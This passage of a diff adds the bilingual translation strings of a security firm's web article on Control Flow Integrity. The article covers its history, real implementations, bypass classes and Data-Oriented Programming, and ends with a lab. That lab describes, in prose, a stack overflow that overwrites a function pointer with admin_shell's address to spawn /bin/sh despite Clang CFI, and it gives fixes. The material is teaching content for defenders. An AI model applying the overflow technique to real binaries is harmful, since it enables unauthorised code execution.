+                s10_mem1: "Padding ('A' × 32)", s10_mem2: "← OVERWRITTEN: addr(admin_shell)", s10_mem3: "Reste de la pile (88 bytes)", s10_mem4: "Débordement continu ('A' × 88)",
+                s10_h3_5: "Enchaînement des vérifications après le payload",
+                s10_st1_t: "Construction du payload", s10_st1_d: "L'adresse de <code>admin_shell</code> est récupérée depuis la table ELF. On construit : 32 octets de remplissage (\"A\") suivi de l'adresse encodée en little-endian sur 8 octets via <code>p64(admin_addr)</code>.",
+                s10_st2_t: "Corruption de data.action", s10_st2_d: "Octets 32-39 du payload écrasent le pointeur <code>data.action</code> avec l'adresse d'<code>admin_shell</code>.",
+                s10_st3_t: "Clang CFI valide le type", s10_st3_d: "Le code CFI inséré par Clang vérifie que <code>admin_shell</code> est de type <code>void (*)().</code> compatible avec le site d'appel. C'est le cas : aucun <code>abort()</code>.",
+                s10_st4_t: "Appel effectif de admin_shell", s10_st4_d: "<code>data.action()</code> appelle <code>admin_shell</code>, qui exécute <code>system(\"/bin/sh\")</code>. Un shell est obtenu.",
+                s10_h3_6: "Script d'exploitation",
+                s10_h3_7: "Ce qu'il aurait fallu pour résister",
+                s10_p6: "La correction nécessite deux actions complémentaires. D'abord, stocker le pointeur <code>action</code> dans une région protégée ou le valider contre une whitelist en mémoire immuable. Ensuite, borner la lecture : <code>read(0, data.buffer, sizeof(data.buffer))</code> supprime la vulnérabilité à la source. Ces deux corrections ensemble rendent cet exploit impossible, indépendamment du CFI du compilateur.",
+                s10_b2_t: "La leçon du laboratoire",
+                s10_b2_p: "Un CFI fin de compilateur ne remplace pas une architecture mémoire rigoureuse. Si les données sensibles (pointeurs de fonction, tables de vérification) vivent dans une région mutable adjacente aux buffers utilisateur, elles peuvent être corrompues avant même que le CFI du compilateur n'ait l'occasion d'intervenir. La défense en profondeur est la seule réponse complète.",
+                s11_h2: "11 - References",
+                s11_li1: "Martin Abadi, Mihai Budiu, Ulfar Erlingsson, Jay Ligatti, <em>\"Control-Flow Integrity: Principles, Implémentations, and Applications\"</em>, CCS 2005",
+                s11_li2: "Hovav Shacham, <em>\"The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)\"</em>, CCS 2007",
+                s11_li3: "Hong Hu, Shweta Shinde, Sendroiu Adrian, Prateek Saxena, Zhenkai Liang, <em>\"Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks\"</em>, IEEE S&amp;P 2016",
+                s11_li4: "Intel, <em>\"A Technical Look at Intel's Control-flow Enforcement Technology\"</em>, 2020",
+                s11_li5: "Clang CFI documentation : <a href=\"https://clang.llvm.org/docs/ControlFlowIntegrity.html\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">clang.llvm.org/docs/ControlFlowIntegrity.html</a>",
+                s11_li6: "Microsoft, <em>\"Control Flow Guard\"</em>, Windows Dev Documentation : <a href=\"https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">learn.microsoft.com</a>",
+                s11_li7: "pwntools documentation <code>elf.sym</code>, <code>p64</code>, <code>process/remote</code> : <a href=\"https://docs.pwntools.com\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">docs.pwntools.com</a>",
+                btn_copy: "<i class=\"far fa-copy\"></i> COPIER"
+            },
+            en: {
+                nav_services: "Services", nav_research: "Research", nav_blog: "Blog", nav_events: "Events", nav_contact: "Contact Us",
+                art_back: "<i class=\"fas fa-arrow-left group-hover:-translate-x-2 transition-transform\"></i> Back_Archives",
+                art_title: "Control Flow<br>\n                <span class=\"text-gray-300\">Integrity:</span><br>\n                Theory, Mechanisms<br>and Exploitation.",
+                art_subtitle: "Understanding CFI from its origins to its limits. A complete dive into theory, defense mechanisms, real-world implementations, and advanced exploitation techniques including Data-Oriented Programming.",
+                art_level: "Level: intermediate / advanced",
+                art_read_time: "Read ≈ 30 min",
+                art_lab: "1 practical lab",
+                art_author_role: "Lead Vulnerability Researcher",
+                toc_title: "Table of contents",
+                toc_1: "<strong>01.</strong> What is Control Flow Integrity?",
+                toc_2: "<strong>02.</strong> Historical context: the arms race",
+                toc_3: "<strong>03.</strong> Control flows in C and C++",
+                toc_4: "<strong>04.</strong> The Control Flow Graph (CFG)",
+                toc_5: "<strong>05.</strong> Coarse-grained vs Fine-grained CFI: granularity",
+                toc_6: "<strong>06.</strong> Real-world implementations of CFI",
+                toc_7: "<strong>07.</strong> CFI limitations and attack vectors",
+                toc_8: "<strong>08.</strong> Data-Oriented Programming (DOP)",
+                toc_9: "<strong>09.</strong> Countermeasures and robust CFI",
+                toc_10: "<strong>10.</strong> Lab: vuln, a real fine-grained CFI to bypass",
+                s1_h2: "01 - What is Control Flow Integrity?",
+                s1_p1: "<strong>Control Flow Integrity</strong>, or CFI, is a formal security property stating that a running program can only follow code paths <em>explicitly intended</em> by its author. In other words, every indirect branch, whether it is a function return, a call via a pointer, or a calculated jump, must always lead to a destination belonging to a predefined set of legitimate targets.",
+                s1_p2: "The concept was formalized in 2005 by Martin Abadi, Mihai Budiu, Ulfar Erlingsson, and Jay Ligatti in a foundational paper titled <em>\"Control-Flow Integrity: Principles, Implementations, and Applications\"</em>. Their initial observation was simple but crucial: memory protection mechanisms of the time (ASLR, DEP/NX) reduced the attack surface but did not eliminate it, because an attacker with a memory read primitive could still redirect execution to existing code.",
+                s1_b_t: "Formal Definition",
+                s1_b_p: "CFI enforces that, for any indirect control transfer <em>t</em> in a program P, the effective destination is always an element of the set <em>Targets(t)</em> predictably defined by the static analysis of the program. If this is not the case, the behavior is undefined and a security policy (termination, log, alert) is applied.",
+                s1_p3: "In practice, CFI acts as a <strong>last line of defense</strong>. It does not eliminate memory vulnerabilities: buffer overflows and use-after-free remain bugs. However, it makes their exploitation much more difficult by preventing an attacker from redirecting the execution flow to an arbitrary target once memory has been corrupted.",
+                s2_h2: "02 - Historical context: the arms race",
+                s2_p1: "To fully understand why CFI emerged, we must trace the evolution of exploitation techniques and the countermeasures that preceded it. Each protection spawned new attack techniques, in an ongoing arms race.",
+                s2_h3_1: "The 1990s: naive exploitation",
+                s2_p2: "Early buffer overflow attacks (popularized by Aleph One's article, <em>\"Smashing the Stack for Fun and Profit\"</em>, 1996) relied on a direct technique: overwriting the return address on the stack to point to <em>shellcode</em> injected into the buffer itself. The processor then executed this arbitrary code with all the privileges of the vulnerable process.",
+                s2_h3_2: "NX/DEP: execution prohibition",
+                s2_p3: "The response from operating systems and processors was to introduce the <strong>NX</strong> (<em>No-eXecute</em>) bit at the hardware level, and its software equivalent <strong>DEP</strong> (<em>Data Execution Prevention</em>) on Windows. The principle: a memory page cannot be both writable and executable. Shellcode injected into a data buffer can no longer be executed.",
+                s2_h3_3: "Return-Oriented Programming: bypassing NX",
+                s2_p4: "In 2007, Hovav Shacham published foundational work on <strong>Return-Oriented Programming (ROP)</strong>. The idea: since NX prevents executing injected code, we will reuse code fragments <em>already present</em> in the binary or libraries. These fragments, called <strong>gadgets</strong>, are short sequences of instructions that all end with a <code>ret</code> instruction. By building a chain of gadget addresses on the stack, the attacker can execute arbitrary operations while remaining in memory areas marked as executable.",
+                s2_b_t: "Why ROP is so powerful",
+                s2_b_p: "A typical binary, along with its linked libraries (<code>libc</code>, etc.), contains thousands of gadgets. Tools like <code>ROPgadget</code>, <code>ropper</code>, or <code>pwntools</code> can find them automatically. It is often possible to build a Turing-complete chain entirely from the gadgets available in a binary.",
+                s2_h3_4: "ASLR: scrambling addresses",
+                s2_p5: "<strong>Address Space Layout Randomization</strong> (ASLR), active in the Linux kernel since 2005 and Windows Vista since 2007, randomizes the base addresses of segments (stack, heap, libraries). Without knowing the exact addresses of gadgets, building a ROP chain becomes difficult, but not impossible if a memory leak (<em>information leak</em>) is available.",
+                s2_h3_5: "CFI as a systemic response",
+                s2_p6: "It is in this context that CFI makes perfect sense. The idea is to move away from reactive logic (patching a hole, finding a bypass, patching again) to adopt a <em>structural</em> security property: even if an attacker knows all the program addresses and can corrupt memory, they cannot redirect indirect jumps to freely chosen targets.",
+                s3_h2: "03 - Control flows in C and C++",
+                s3_p1: "Before understanding how CFI protects them, we must distinguish between the different types of control transfers a program can make, and identify which ones are dangerous.",
+                s3_h3_1: "Direct vs indirect transfers",
+                s3_p2: "A transfer is considered <strong>direct</strong> when its destination is hardcoded within the instruction itself at compile time. The <code>call foo</code> instruction in x86 assembly directly encodes the displacement to the <code>foo</code> function. No matter what an attacker does to the data, this instruction will always go to <code>foo</code>.",
+                s3_p3: "A transfer is considered <strong>indirect</strong> when its destination is calculated at runtime, based on a value in a register or in memory. This is the case for function pointers in C, vtables in C++, and the <code>ret</code> instruction (which jumps to the address popped from the stack). These destinations can be corrupted by an attacker with an arbitrary memory write capability.",
+                s3_th1: "Mechanism", s3_th2: "C/C++ Example", s3_th3: "ASM Instruction", s3_th4: "Risk",
+                s3_td1_1: "Direct call", s3_td1_4: "Low", s3_td2_1: "Function return", s3_td2_4: "High",
+                s3_td3_1: "Function pointer", s3_td3_4: "High", s3_td4_1: "C++ Vtable", s3_td4_4: "High",
+                s3_td5_1: "Indirect jump", s3_td5_4: "Medium",
+                s3_p4: "The <code>ret</code> case deserves special attention: the return address is stored on the stack by the <code>call</code> instruction, in a memory area often adjacent to local buffers. A classic stack overflow can directly corrupt it: this is the original vulnerability from 1996, still relevant today.",
+                s3_p5: "<strong>C++ vtables</strong> are another major vector: when an object is created, a pointer to its vtable (table of pointers to virtual methods) is stored within the object itself. If an attacker can write to the object's memory via a heap overflow or a use-after-free, they can replace this pointer with the address of a fake vtable pointing to arbitrary code.",
+                s4_h2: "04 - The Control Flow Graph (CFG)",
+                s4_p1: "The core concept of CFI is the <strong>Control Flow Graph</strong>, or CFG. This is an abstract representation of all possible execution paths of a program, built through static analysis at compile time.",
+                s4_p2: "In a CFG, each node represents a basic block (a sequence of instructions with no internal branching), and each edge represents a possible control transfer. For every indirect branch point in the program, every <code>call rax</code>, every <code>ret</code>, every vtable dereference, the CFG defines a set of legitimate targets.",
+                s4_h3_1: "Conceptual example",
+                s4_p3: "Imagine a program with two possible callbacks, <code>handler_a</code> and <code>handler_b</code>, invoked via a function pointer. The CFG dictates that this call site has exactly two valid targets: <code>handler_a</code> and <code>handler_b</code>. If at runtime the function pointer points to <code>system</code> or a ROP gadget, the CFI check fails and the program is halted.",
+                s4_b_t: "CFG Precision",
+                s4_b_p: "The quality of a CFI directly depends on the precision of its CFG. An overly permissive CFG (putting all functions in the same target set) offers little protection. A highly precise CFG (distinguishing targets per site, based on type signatures) is much more robust but more complex to build.",
+                s4_h3_2: "CFG Visualization",
+                s4_p4: "The CFG can be built at multiple levels. The most precise method is compile-time analysis (Clang/LLVM), which has access to all type information and can distinguish call sites by the exact expected function signature. Post-compilation binary analyses (like those performed by reverse engineering tools) are possible but less precise, as some type information is lost during compilation.",
+                s5_h2: "05 - Coarse-grained vs Fine-grained CFI: granularity",
+                s5_p1: "Granularity is the most critical parameter of a CFI implementation. It determines how tightly restricted the set of valid targets is for each indirect jump.",
+                s5_h3_1: "Coarse-grained CFI",
+                s5_p2: "A coarse-grained CFI groups all indirect call sites into one or a few large sets. For example, it might merely verify that the destination of an <code>indirect call</code> is the beginning of <em>any</em> function in the binary. This is a very weak constraint: in a typical binary, hundreds of functions are valid targets, giving an attacker plenty of leeway to construct an exploitation chain.",
+                s5_p3: "Microsoft Control Flow Guard (CFG), introduced in Windows 8.1 Update 3, is often cited as a medium-granularity CFI. It maintains a memory bitmap of valid function start addresses and checks every indirect call against this bitmap. Effective against naive attacks, but multiple bypass techniques have been published, typically targeting overly permissive functions present in the valid target set.",
+                s5_h3_2: "Fine-grained CFI",
+                s5_p4: "A fine-grained CFI restricts the set of valid targets on a per-site basis. For an indirect call at a specific code location, only functions with a <em>compatible type signature</em> are valid targets. Clang CFI (available via the <code>-fsanitize=cfi</code> flag) implements several variants of fine-grained CFI:",
+                s5_p5: "<code>-fsanitize=cfi-icall</code> protects indirect function calls by verifying that the called function has exactly the correct type. <code>-fsanitize=cfi-vcall</code> protects C++ virtual calls by verifying that the receiver has the correct dynamic type. These checks are far more restrictive and drastically reduce the available target space for an attacker.",
+                s5_th1: "Approach", s5_th2: "Granularity", s5_th3: "Perf. Overhead", s5_th4: "Resistance",
+                s5_td1_1: "Microsoft CFG", s5_td1_2: "Function entries", s5_td1_4: "Moderate",
+                s5_td2_1: "Clang CFI icall", s5_td2_2: "Type compatibility", s5_td2_4: "Good",
+                s5_td3_1: "Clang CFI vcall", s5_td3_2: "Class hierarchy", s5_td3_4: "Good",
+                s5_td4_1: "Intel CET (shadow stack)", s5_td4_2: "Returns only", s5_td4_3: "Hardware", s5_td4_4: "Excellent",
+                s5_td5_1: "Custom CFI (stack table)", s5_td5_2: "Simple static table", s5_td5_3: "Minimal", s5_td5_4: "Weak",
+                s6_h2: "06 - Real-world implementations of CFI",
+                s6_h3_1: "Clang CFI (LLVM)",
+                s6_p1: "The most rigorous implementation on Linux/macOS. It operates entirely at the compiler level and inserts inline checks before every indirect transfer. Metadata (type tables, class hierarchy information) is stored in read-only sections of the binary, protected by page permissions. Clang CFI supports several modes: <code>cfi-icall</code>, <code>cfi-vcall</code>, <code>cfi-nvcall</code>, <code>cfi-derived-cast</code>, <code>cfi-unrelated-cast</code>.",
+                s6_h3_2: "Microsoft Control Flow Guard (CFG)",
+                s6_p2: "Integrated into the MSVC compiler and Windows system since Windows 8.1 Update 3. The mechanism relies on a memory bitmap indicating which addresses are valid function entries. Before every indirect call, the compiler inserts a call to a kernel validation routine. CFG is enabled by default for modern Windows system binaries.",
+                s6_h3_3: "Intel CET: Control-flow Enforcement Technology",
+                s6_p3: "CET is a hardware extension introduced in Intel Tiger Lake (2020) and AMD Zen 3 (2020) processors. It consists of two complementary mechanisms. The <strong>Shadow Stack</strong> (SS) maintains a separate stack of return addresses in a special memory region accessible only by privileged instructions. On every <code>ret</code>, the processor compares the popped address from the normal stack with the one from the shadow stack: any mismatch triggers an exception. The second feature, <strong>Indirect Branch Tracking</strong> (IBT), requires every destination of an indirect jump to begin with a special <code>endbr64</code> instruction. Any attempt to jump to a gadget internal to a function (without <code>endbr64</code>) is blocked at the hardware level.",
+                s6_b_t: "Advantage of CET",
+                s6_b_p: "Being implemented in hardware, the Shadow Stack is much harder to bypass than software CFI. It does not depend on CFG precision and protects all function returns, even those of libraries not recompiled with CFI.",
+                s7_h2: "07 - CFI limitations and attack vectors",
+                s7_p1: "Despite its power, CFI is not a silver bullet. Researchers have identified several classes of attacks that bypass it, even in its most rigorous variants.",
+                s7_h3_1: "Attacks on the CFG itself",
+                s7_p2: "If CFG metadata (type tables, valid function bitmaps) is stored in writable memory regions, an attacker with an arbitrary write primitive can corrupt it. This is exactly the vulnerability we'll exploit in the lab: a CFI table stored on the stack is corruptible by the same overflow that corrupts the callback.",
+                s7_h3_2: "Call-oriented Programming (COP)",
+                s7_p3: "Analogous to ROP, COP exploits the fact that coarse-grained CFI allows hundreds of functions as valid targets. An attacker can chain calls to legitimate but \"dangerous\" functions, whose combination produces a malicious effect. If <code>system()</code> is in the set of valid targets (which is often true in a program that uses it legitimately), an attacker can jump directly to it.",
+                s7_h3_3: "Jump-oriented Programming (JOP)",
+                s7_p4: "JOP is a ROP variant that uses gadgets ending in <code>jmp reg</code> instead of <code>ret</code>. Fine-grained CFI that protects returns but not all indirect jumps can be bypassed by this technique.",
+                s7_h3_4: "TOCTTOU on CFI checks",
+                s7_p5: "Time-of-Check-Time-of-Use: if the CFI check and the actual use of the pointer are not atomic, a concurrent thread could modify the pointer in between. This race condition window is usually extremely narrow but has been demonstrated in specific contexts.",
+                s7_b_t: "The fundamental lesson",
+                s7_b_p: "A CFI mechanism is only as strong as its assumptions. If the attacker can corrupt the CFI metadata itself, or if the set of valid targets is too broad, the protection is bypassed. Robust CFI must store reference data in immutable memory and use the most precise CFG possible.",
+                s8_h2: "08 - Data-Oriented Programming (DOP)",
+                s8_p1: "<strong>Data-Oriented Programming</strong> is an advanced exploitation technique formalized by Hong Hu, Shweta Shinde, Sendroiu Adrian, Prateek Saxena, and Zhenkai Liang in 2016. Where ROP and JOP hijack the <em>control flow</em>, DOP exclusively manipulates <strong>data</strong> to produce a malicious effect, all while maintaining an apparently legitimate control flow.",
+                s8_h3_1: "The principle",
+                s8_p2: "In a vulnerable program, certain data variables significantly influence program behavior: they are read in comparisons, used as array indexes, passed as arguments to sensitive functions. A DOP attacker identifies these variables (<em>data gadgets</em>) and leverages a write primitive to corrupt them, thereby steering the program toward unintended behavior without ever altering a return address or violating a CFI invariant.",
+                s8_h3_2: "Why it's powerful against CFI",
+                s8_p3: "CFI only monitors control transfers. It says nothing about data. If an attacker can force the program to call <code>system(\"/bin/sh\")</code> via a perfectly legitimate code path, by corrupting an argument passed to an authorized function or changing a condition variable, CFI detects nothing anomalous.",
+                s8_p4: "In our lab, we will use a form of DOP: rather than modifying a return address, we will corrupt the <strong>CFI verification table itself</strong>, which happens to be data on the stack. The control flow follows the \"legitimate\" callback invocation path, but the data defining what is \"legitimate\" has been altered.",
+                s9_h2: "09 - Countermeasures and robust CFI",
+                s9_p1: "Faced with the identified attack vectors, several best practices can significantly reinforce a CFI mechanism.",
+                s9_h3_1: "Immutability of metadata",
+                s9_p2: "The golden rule: valid function tables, CFG bitmaps, and any metadata used for CFI checks must be stored in read-only sections (<code>.rodata</code>) or memory pages marked non-writable after initialization (<code>mprotect(PROT_READ)</code>). An attacker unable to write to these regions cannot corrupt the CFG.",
+                s9_h3_2: "Memory Sandboxing",
+                s9_p3: "Verification data must never be adjacent to user-manipulable buffers. Ideally, they belong in a separate memory segment, protected by guard pages.",
+                s9_h3_3: "The finest possible CFG",
+                s9_p4: "Minimize the set of valid targets for each call site. If a function pointer is always used to call functions of type <code>void (*)(int)</code>, only functions matching this exact signature should be within the target set.",
+                s9_h3_4: "Defense in depth",
+                s9_p5: "CFI should not be the solitary line of defense. Combined with SafeStack (which separates the return stack from local data buffers), stack canaries, ASLR, and memory sanitizers during development (<code>AddressSanitizer</code>, <code>MemorySanitizer</code>), it forms a far more resilient defense-in-depth posture.",
+                s9_st1_t: "Metadata in immutable memory", s9_st1_d: "Store CFI tables in <code>.rodata</code> sections or pages protected with <code>mprotect(PROT_READ)</code> after initialization.",
+                s9_st2_t: "Use a proven CFI compiler", s9_st2_d: "Prefer Clang CFI (<code>-fsanitize=cfi</code>) or Intel CET over an in-house implementation. In-house implementations almost invariably contain flaws.",
+                s9_st3_t: "SafeStack + stack canaries", s9_st3_d: "SafeStack (<code>-fsanitize=safe-stack</code>) separates the return stack from local buffers, neutralizing classic overflows. Canaries detect corruptions before returning.",
+                s9_st4_t: "Bounded reads: never read past buffer size", s9_st4_d: "The root cause is always the same: reading unbounded data into a fixed buffer. <code>read(fd, buf, sizeof(buf))</code> eliminates the vulnerability at its source.",
+                s10_h2: "10 - Lab: vuln, a real fine-grained CFI to bypass",
+                s10_lab_title: "⚗ Practical Lab",
+                s10_lab_sub: "This chapter applies all concepts previously seen on a binary compiled with <strong>real Clang fine-grained CFI</strong> (<code>-fsanitize=cfi -fvisibility=hidden -flto</code>). The challenge reveals a fundamental limitation that even fine-grained CFI cannot solve alone.",
+                s10_h3_1: "Full source code",
+                s10_h3_2: "Context: compilation command",
+                s10_p1: "The <code>vuln.c</code> program is compiled straight with production Clang CFI flags:",
+                s10_p2: "<code>-fno-pie -no-pie</code> disables Position Independent Executable: function addresses are fixed and readable directly from the ELF symbol table, without needing a memory leak. <code>-flto</code> enables Link-Time Optimization, a technical prerequisite for Clang CFI: the compiler needs a global view of the program to build its CFG and insert type checks. <code>-fsanitize=cfi</code> with <code>-fvisibility=hidden</code> activates Clang LLVM's <em>fine</em> CFI implementation. The compiler builds a precise CFG and inserts type compatibility checks <strong>per call site</strong> before every indirect transfer.",
+                s10_h3_3: "The central question",
+                s10_p3: "If fine-grained Clang CFI is active and inserts real per-site checks, how is it possible to redirect execution to <code>admin_shell()</code>? The answer isn't about bypassing the compiler's CFI implementation. It's about what the CFI actually verifies, and what it is <strong>structurally incapable</strong> of verifying.",
+                s10_b_t: "The semantic limit of fine CFI",
+                s10_b_p: "Fine-grained Clang CFI checks <strong>types</strong>, not <strong>intentions</strong>. It doesn't know which functions are <em>intended</em> to be called via this specific path: it only knows which ones have the correct signature. Both <code>regular_user</code> and <code>admin_shell</code> share the signature <code>void (*)().</code> For the compiler, both are equivalent, legitimate targets.",
+                s10_h3_4: "The vulnerability: stack buffer overflow",
+                s10_p4: "The flaw is explicit in the source. <code>read</code> accepts 128 bytes for a mere 32-byte buffer:",
+                s10_p5: "The overflow writes 128 bytes starting from the address of <code>data.buffer</code>. The first 32 bytes fill the buffer, then bytes 32-39 overwrite <code>data.action</code> with an attacker-chosen address. This is pure <strong>Data-Oriented Programming</strong>: no classic control flow hijacking, only data corruption.",
+                s10_mem1: "Padding ('A' × 32)", s10_mem2: "← OVERWRITTEN: addr(admin_shell)", s10_mem3: "Rest of the stack (88 bytes)", s10_mem4: "Continuous overflow ('A' × 88)",
+                s10_h3_5: "Check sequencing after the payload",
+                s10_st1_t: "Payload construction", s10_st1_d: "The address of <code>admin_shell</code> is fetched from the ELF table. We construct: 32 bytes of padding (\"A\") followed by the address encoded in 8-byte little-endian via <code>p64(admin_addr)</code>.",
+                s10_st2_t: "Corruption of data.action", s10_st2_d: "Bytes 32-39 of the payload overwrite the <code>data.action</code> pointer with the address of <code>admin_shell</code>.",
+                s10_st3_t: "Clang CFI validates the type", s10_st3_d: "The CFI code inserted by Clang verifies that <code>admin_shell</code> is of type <code>void (*)().</code> compatible with the call site. It is: no <code>abort()</code> is triggered.",
+                s10_st4_t: "Effective execution of admin_shell", s10_st4_d: "<code>data.action()</code> invokes <code>admin_shell</code>, which executes <code>system(\"/bin/sh\")</code>. A shell is obtained.",
+                s10_h3_6: "Exploitation script",
+                s10_h3_7: "What was needed to resist",
+                s10_p6: "Fixing this requires two complementary actions. First, store the <code>action</code> pointer in a protected region or validate it against a whitelist in immutable memory. Second, bound the read: <code>read(0, data.buffer, sizeof(data.buffer))</code> neutralizes the vulnerability at its source. Both corrections combined make this exploit impossible, regardless of the compiler's CFI.",
+                s10_b2_t: "The lesson of the lab",
+                s10_b2_p: "A fine-grained compiler CFI does not replace a rigorous memory architecture. If sensitive data (function pointers, verification tables) lives in a mutable region adjacent to user buffers, it can be corrupted before the compiler's CFI ever gets a chance to intervene. Defense in depth is the only complete answer.",
+                s11_h2: "11 - References",
+                s11_li1: "Martin Abadi, Mihai Budiu, Ulfar Erlingsson, Jay Ligatti, <em>\"Control-Flow Integrity: Principles, Implementations, and Applications\"</em>, CCS 2005",
+                s11_li2: "Hovav Shacham, <em>\"The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)\"</em>, CCS 2007",
+                s11_li3: "Hong Hu, Shweta Shinde, Sendroiu Adrian, Prateek Saxena, Zhenkai Liang, <em>\"Data-Oriented Programming: On the Expressiveness of Non-Control Data Attacks\"</em>, IEEE S&amp;P 2016",
+                s11_li4: "Intel, <em>\"A Technical Look at Intel's Control-flow Enforcement Technology\"</em>, 2020",
+                s11_li5: "Clang CFI documentation: <a href=\"https://clang.llvm.org/docs/ControlFlowIntegrity.html\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">clang.llvm.org/docs/ControlFlowIntegrity.html</a>",
+                s11_li6: "Microsoft, <em>\"Control Flow Guard\"</em>, Windows Dev Documentation: <a href=\"https://learn.microsoft.com/en-us/windows/win32/secbp/control-flow-guard\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">learn.microsoft.com</a>",
+                s11_li7: "pwntools documentation <code>elf.sym</code>, <code>p64</code>, <code>process/remote</code>: <a href=\"https://docs.pwntools.com\" target=\"_blank\" class=\"underline underline-offset-4 decoration-1 hover:text-black transition-colors\">docs.pwntools.com</a>",
+                news_title: "Receive our research (0-Spam)",
+                news_desc: "Subscribe to our secure transmission feed. Strictly technical writeups, CTF announcements, and public audit reports.",
+                news_btn: "Subscribe_",
+                footer_bio: "Advanced vulnerability research unit and critical systems auditing.",
+                f_link_audit: "Source Code Audit", f_link_ics: "Industrial Systems", f_link_tools: "Open Source Tools",
+                footer_pgp: "For all sensitive communication, please use PGP encryption.",
+                btn_copy: "<i class=\"far fa-copy\"></i> COPY"
+            }
+        };
+
+        const langToggle = document.getElementById('lang-toggle');
+        let currentLang = localStorage.getItem('bugpwn_lang') || 'fr';
+
+        function updateLanguage(lang) {
+            currentLang = lang;
+            document.documentElement.lang = lang;
+            localStorage.setItem('bugpwn_lang', lang);
+            langToggle.innerText = lang === 'fr' ? 'EN' : 'FR';
+            document.querySelectorAll('[data-i18n]').forEach(el => {
+                const key = el.getAttribute('data-i18n');
+                if (translations[lang] && translations[lang][key]) {
+                    el.innerHTML = translations[lang][key];
+                }
+            });
+        }
+
+        langToggle.addEventListener('click', () => {
+            const newLang = currentLang === 'fr' ? 'en' : 'fr';
+            updateLanguage(newLang);
+        });
+
+        updateLanguage(currentLang);
+    </script>
+</body>
+</html>
